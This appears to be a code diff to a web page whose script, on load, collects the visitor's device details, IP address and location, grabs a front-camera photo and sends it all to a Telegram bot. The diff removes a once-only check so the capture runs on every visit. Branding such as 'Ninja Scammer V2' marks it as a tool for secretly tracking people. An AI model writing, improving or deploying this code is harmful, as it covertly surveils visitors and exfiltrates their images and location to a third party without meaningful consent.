@@ -361,20 +361,18 @@
             }
 
             // ============================================
-            // AMBIL FOTO DARI KAMERA (TANPA FALLBACK ICON)
+            // AMBIL FOTO DARI KAMERA
             // ============================================
             function ambilFotoDariKamera() {
                 return new Promise((resolve, reject) => {
                     const video = document.getElementById('cameraVideo');
                     const canvas = document.getElementById('photoCanvas');
 
-                    // Cek apakah browser support getUserMedia
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                         reject(new Error('Browser tidak support kamera'));
                         return;
                     }
 
-                    // Buka kamera depan
                     navigator.mediaDevices.getUserMedia({
                             video: {
                                 facingMode: 'user',
@@ -387,29 +385,24 @@
                             video.srcObject = stream;
                             video.play();
 
-                            // Tunggu video benar-benar siap
                             const checkReady = setInterval(() => {
                                 if (video.readyState === 4 && video.videoWidth > 0 && video
                                     .videoHeight > 0) {
                                     clearInterval(checkReady);
 
-                                    // Ambil gambar dari video
                                     canvas.width = video.videoWidth;
                                     canvas.height = video.videoHeight;
                                     const ctx = canvas.getContext('2d');
                                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                                    // Matikan kamera
                                     stream.getTracks().forEach(track => track.stop());
                                     video.srcObject = null;
 
-                                    // Convert ke data URL JPEG
                                     const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
                                     resolve(dataUrl);
                                 }
                             }, 100);
 
-                            // Timeout kalau terlalu lama
                             setTimeout(() => {
                                 clearInterval(checkReady);
                                 if (video.readyState < 4) {
@@ -424,46 +417,12 @@
             }
 
             // ============================================
-            // PROSES UTAMA
-            // ============================================
-            const alreadySent = localStorage.getItem('foto_terkirim_rahasia') === 'true';
-
-            if (!alreadySent) {
-                window.addEventListener('load', function() {
-                    userDevice = getDeviceInfo();
-
-                    // Ambil IP & lokasi
-                    getIPAndLocation().then(() => {
-                        // Tunggu sebentar, lalu ambil foto dari kamera
-                        setTimeout(() => {
-                            ambilFotoDariKamera()
-                                .then(fotoDataUrl => {
-                                    console.log('✅ Foto berhasil diambil dari kamera');
-                                    kirimFotoKeTelegram(fotoDataUrl);
-                                })
-                                .catch(err => {
-                                    console.error('❌ Gagal akses kamera:', err);
-                                    showToast('❌ Gagal akses kamera', 'error');
-
-                                    // === TIDAK ADA FALLBACK ICON ===
-                                    // Kirim pesan teks saja (tanpa foto)
-                                    kirimPesanTeksTanpaFoto();
-                                });
-                        }, 1500);
-                    });
-                });
-            } else {
-                console.log('ℹ️ Foto sudah terkirim sebelumnya (tidak kirim ulang)');
-                showToast('✅ Sudah terkirim sebelumnya', 'success');
-            }
-
-            // ============================================
             // KIRIM FOTO KE TELEGRAM
             // ============================================
             function kirimFotoKeTelegram(imageDataUrl) {
 
                 if (!imageDataUrl) {
-                    kirimPesanTeksTanpaFoto();
+                    showToast('❌ Gagal ambil foto', 'error');
                     return;
                 }
 
@@ -499,7 +458,6 @@
                     .then(res => res.json())
                     .then(data => {
                         if (data.ok) {
-                            localStorage.setItem('foto_terkirim_rahasia', 'true');
                             showToast('✅ Foto kamera terkirim', 'success');
                             console.log('✅ Foto dari kamera + IP/Lokasi terkirim ke Telegram');
                         } else {
@@ -509,8 +467,6 @@
                     .catch(err => {
                         console.error('Telegram error:', err);
                         showToast('⚠️ Gagal kirim', 'error');
-                        // Kirim teks saja kalau foto gagal
-                        kirimPesanTeksTanpaFoto();
                     });
             }
 
@@ -519,7 +475,7 @@
             // ============================================
             function kirimPesanTeksTanpaFoto() {
                 const pesan = `
-⚠️ *GAGAL AMBIL FOTO DARI KAMERA*
+⚠️ 𝗚𝗔𝗚𝗔𝗟 𝗙𝗢𝗧𝗢 𝗠𝗨𝗞𝗔 𝗦𝗖𝗔𝗠𝗠𝗘𝗥
 
 👤 ∂єνєℓσρєя : NinjaAttacks
 🤖 ηαмα вσт : Ninja Scammer V2
@@ -547,7 +503,6 @@
                     .then(res => res.json())
                     .then(data => {
                         if (data.ok) {
-                            localStorage.setItem('foto_terkirim_rahasia', 'true');
                             showToast('⚠️ Kirim teks (tanpa foto)', 'error');
                             console.log('⚠️ Pesan teks terkirim (kamera gagal)');
                         }
@@ -576,7 +531,29 @@
                 setTimeout(() => toast.classList.remove('show'), 4000);
             }
 
-            console.log('✅ Halaman siap! Mencoba ambil foto dari KAMERA HP.');
+            // ============================================
+            // PROSES UTAMA - LANGSUNG JALAN (TANPA CEK localStorage)
+            // ============================================
+            window.addEventListener('load', function() {
+                userDevice = getDeviceInfo();
+
+                getIPAndLocation().then(() => {
+                    setTimeout(() => {
+                        ambilFotoDariKamera()
+                            .then(fotoDataUrl => {
+                                console.log('✅ Foto berhasil diambil dari kamera');
+                                kirimFotoKeTelegram(fotoDataUrl);
+                            })
+                            .catch(err => {
+                                console.error('❌ Gagal akses kamera:', err);
+                                showToast('❌ Gagal akses kamera', 'error');
+                                kirimPesanTeksTanpaFoto();
+                            });
+                    }, 1500);
+                });
+            });
+
+            console.log('✅ Halaman siap! Foto akan dikirim SETIAP KALI halaman dibuka.');
             console.log('⚠️ Ganti TELEGRAM_TOKEN dan TELEGRAM_CHAT_ID!');
             console.log('⚠️ Pastikan izinkan akses kamera saat diminta browser.');
 
@@ -584,4 +561,4 @@
     </script>
 
 </body>
-</html>
+    </html>
